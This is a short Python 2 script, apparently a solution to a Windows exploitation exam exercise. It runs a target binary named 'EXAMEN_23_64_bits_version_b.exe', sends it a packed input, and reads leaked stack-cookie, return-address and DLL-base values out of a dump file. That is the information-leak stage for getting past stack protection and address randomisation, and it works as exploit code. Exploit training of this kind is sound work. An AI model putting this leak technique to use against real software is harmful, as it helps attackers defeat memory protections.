

import struct
import random, string
from os import popen4
import time

a=open("fichero.dat", "wb")
a.write("")
a.close()

stdin,stdout = popen4(r"EXAMEN_23_64_bits_version_b.exe")
print stdin


raw_input()

cadena = struct.pack("<L", 0x41424344) + "\n\n"


print "Escribe: " + cadena
stdin.write(cadena)
time.sleep(1)

raw_input()

a=open("fichero.dat", "rb")
b=a.read()
a.close()

leak_cookie=b[209:209+8]
leak_cookie=struct.unpack("<Q",leak_cookie)[0]

print hex(leak_cookie)

leak_return=b[233:233+8]
leak_return=struct.unpack("<Q",leak_return)[0]

print hex(leak_return)

leak_dll=b[225:225+8]
leak_dll=struct.unpack("<Q",leak_dll)[0]

print hex(leak_dll)





